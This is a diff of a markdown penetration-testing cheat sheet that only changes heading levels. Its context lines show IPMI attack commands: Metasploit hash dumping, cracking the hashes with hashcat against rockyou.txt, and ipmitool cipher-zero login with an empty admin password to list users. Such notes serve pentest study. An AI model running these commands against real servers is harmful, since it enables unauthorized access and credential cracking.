@@ -1,5 +1,5 @@
 
-## Dump Hashes
+### Dump Hashes
 
 ```bash
 sudo msfconsole -q
@@ -15,7 +15,7 @@ set OUTPUT_HASHCAT_FILE ipmi.hashcat
 hashcat -m 7300 ipmi.hashcat /opt/rockyou.txt --username
 ```
 
-## List of Users
+### List of Users
 
 ```bash
 ipmitool -I lanplus -C 0 -H 192.168.0.145 -U admin -P "" user list | ipmi_list.txt
